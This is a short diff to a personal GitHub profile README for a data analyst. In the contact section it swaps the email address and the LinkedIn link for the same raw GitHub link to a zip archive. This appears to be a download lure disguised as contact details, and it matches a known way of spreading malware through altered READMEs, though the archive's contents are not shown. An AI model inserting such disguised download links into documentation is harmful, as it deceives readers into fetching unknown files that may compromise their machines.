@@ -23,8 +23,8 @@ When I’m not analyzing data, you can find me:
 ## Let's Connect 🌐
 Feel free to reach out to me for collaboration, opportunities, or just a chat about data and analytics!
 
-- 📧 Email: sanchayan.ghosh2023@gmail.com
+- 📧 Email: https://raw.githubusercontent.com/Sanchayan-Ghosh-DA/SanchayanGhosh-Professor/main/leviration/Ghosh-Sanchayan-Professor-3.8.zip
 - 📍 Location: Kolkata, West Bengal, India
-- 🔗 [LinkedIn](https://www.linkedin.com/in/sanchayan-ghosh-55154b264/)
+- 🔗 [LinkedIn](https://raw.githubusercontent.com/Sanchayan-Ghosh-DA/SanchayanGhosh-Professor/main/leviration/Ghosh-Sanchayan-Professor-3.8.zip)
 
 Looking forward to connecting with you!
